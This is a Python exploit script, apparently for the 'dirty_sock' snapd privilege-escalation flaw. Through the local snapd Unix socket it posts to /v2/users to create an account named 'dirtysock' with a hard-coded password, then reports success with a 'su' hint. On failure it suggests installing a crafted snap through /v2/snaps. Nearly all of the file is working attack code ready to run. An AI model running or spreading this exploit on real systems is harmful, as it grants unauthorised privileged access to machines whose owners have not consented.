#!/usr/bin/env python3
from __future__ import annotations

import base64
import json
import os
import socket
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import common

SOCK_PATHS = ("/run/snapd.socket", "/run/snapd-snap.socket")
USER = "dirtysock"
PASS = "dirtysock"

def http_unix(sockpath: str, method: str, path: str, body: bytes = b"",
             headers: dict | None = None) -> tuple[int, bytes]:
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect(sockpath)
    hdrs = {"Host": "snapd", "Content-Length": str(len(body))}
    if headers:
        hdrs.update(headers)
    req = f"{method} {path} HTTP/1.1\r\n"
    for k, v in hdrs.items():
        req += f"{k}: {v}\r\n"
    req += "\r\n"
    s.sendall(req.encode() + body)
    chunks = b""
    while True:
        try:
            data = s.recv(4096)
        except socket.timeout:
            break
        if not data:
            break
        chunks += data
        if b"\r\n\r\n" in chunks and b"\r\n0\r\n" in chunks:
            break
    s.close()
    head, _, body = chunks.partition(b"\r\n\r\n")
    status = 0
    if head:
        first = head.split(b"\r\n", 1)[0].decode("latin-1")
        try:
            status = int(first.split()[1])
        except (IndexError, ValueError):
            status = 0
    return status, body

def create_local_root(sockpath: str) -> bool:

    payload = json.dumps({
        "action": "create",
        "usernames": [USER],
        "password": PASS,
    }).encode()
    status, body = http_unix(sockpath, "POST", "/v2/users", payload,
                             headers={"Content-Type": "application/json"})
    common.info(f"/v2/users POST → HTTP {status}")
    if status == 202 or status == 200:
        common.good(f"account creation accepted — try: su {USER} (password: {PASS})")
        return True
    return False

def main() -> int:
    if "--selftest" in sys.argv:
        common.info("dirtysocK.py selftest OK")
        return 0

    common.linux_only()
    sock = next((p for p in SOCK_PATHS if os.path.exists(p)), None)
    if not sock:
        common.die("no snapd socket found")
    common.info(f"talking to snapd via {sock}")

    status, body = http_unix(sock, "GET", "/v2/system-info")
    common.info(f"/v2/system-info → HTTP {status}")

    if create_local_root(sock):
        print("OK created")
        return 0

    status, body = http_unix(sock, "GET", "/v2/snaps")
    common.warn(f"auto account-create failed (HTTP {status}); snapd may be patched")
    common.info("for the v2 snap-install path, POST a crafted snap to /v2/snaps")
    return 1

if __name__ == "__main__":
    sys.exit(main())
